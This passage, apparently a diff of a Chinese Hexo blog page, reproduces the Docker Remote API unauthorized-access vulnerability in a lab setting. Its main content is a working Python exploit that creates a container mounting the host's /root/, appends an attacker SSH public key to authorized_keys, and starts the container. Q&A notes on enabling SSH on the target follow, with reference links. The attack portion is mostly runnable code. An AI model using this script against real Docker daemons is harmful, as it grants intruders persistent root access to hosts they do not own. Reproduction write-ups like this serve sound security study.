headers中添加上content-type这个参数，指定为json格式</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求体数据</span></span><br><span class="line">data = &#123;</span><br><span class="line">  <span class="string">&quot;Image&quot;</span>: image_name,</span><br><span class="line">  <span class="string">&quot;HostConfig&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;Binds&quot;</span>: [</span><br><span class="line">      <span class="string">&quot;/root/:/tmp/:rw&quot;</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;CMD&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;/bin/sh&quot;</span>,</span><br><span class="line">    <span class="string">&quot;-c&quot;</span>,</span><br><span class="line">    <span class="string">&quot;mkdir -p /tmp/.ssh &amp;&amp; echo &quot;</span>+public_key+<span class="string">&quot; &gt;&gt; /tmp/.ssh/authorized_keys&quot;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># post的时候，将data字典形式的参数用json包转换成json格式</span></span><br><span class="line">response = requests.post(url=<span class="string">&#x27;http://&#x27;</span>+ip+<span class="string">&#x27;:&#x27;</span>+port+<span class="string">&#x27;/v1.25/containers/create&#x27;</span>, headers=headers, data=json.dumps(data))</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="comment"># &#123;&quot;Id&quot;:&quot;7603377f77a678e2239c79cfe9d1d4dec5fec3f85554647270263be6c4acecb0&quot;,&quot;Warnings&quot;:[]&#125;</span></span><br><span class="line"></span><br><span class="line">pattern = <span class="string">r&#x27;Id&quot;:&quot;(.*?)&quot;&#x27;</span></span><br><span class="line">container_Id = re.findall(pattern, response.text)[<span class="number">0</span>]</span><br><span class="line">response2 = requests.post(url=<span class="string">&#x27;http://&#x27;</span>+ip+<span class="string">&#x27;:&#x27;</span>+port+<span class="string">&#x27;/v1.25/containers/&#x27;</span>+container_Id+<span class="string">&#x27;/start&#x27;</span>, headers=headers)</span><br><span class="line"><span class="built_in">print</span>(response2.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回为空，没有错误信息 代表启动成功</span></span><br><span class="line">response3 = requests.get(url=<span class="string">&#x27;http://&#x27;</span>+ip+<span class="string">&#x27;:&#x27;</span>+port+<span class="string">&#x27;/v1.25/containers/&#x27;</span>+container_Id+<span class="string">&#x27;/logs?stderr=True&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(response3.text)</span><br></pre></td></tr></table></figure>
+
+<h2 id="问题解决记录"><a href="#问题解决记录" class="headerlink" title="问题解决记录"></a>问题解决记录</h2><p>Q1：没有.ssh&#x2F;id_rsa.pub这个文件或路径？</p>
+<p>A1：ssh-keygen -c 生成</p>
+<p>Q2：ssh无法登陆？</p>
+<p>A2：靶机需要开启ssh登录，步骤如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">安装ssh服务</span><br><span class="line">sudo apt-get install openssh-server</span><br><span class="line"></span><br><span class="line">启动</span><br><span class="line">sudo service ssh start</span><br><span class="line"></span><br><span class="line">查询服务启动状态：</span><br><span class="line">sudo ps -e | grep ssh</span><br><span class="line">或者</span><br><span class="line">sudo service ssh status</span><br><span class="line"></span><br><span class="line">配置开机启动：</span><br><span class="line">sudo sysv-rc-conf</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://www.lightless.me/archives/docker-remote-api-vulnerability.html">Docker Remote API 未授权访问漏洞</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/docker/unauthorized-rce/README.zh-cn.md">Docker daemon api unauthorized access exploit</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag"># 漏洞复现</a>
+              <a href="/tags/docker/" rel="tag"># docker</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/posts/a4848fd3.html" rel="prev" title="docker-compose build加速构建">
+                  <i class="fa fa-chevron-left"></i> docker-compose build加速构建
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/posts/253f8523.html" rel="next" title="Hexo博客迁移小记">
+                  Hexo博客迁移小记 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">iqiqiya</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.0/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
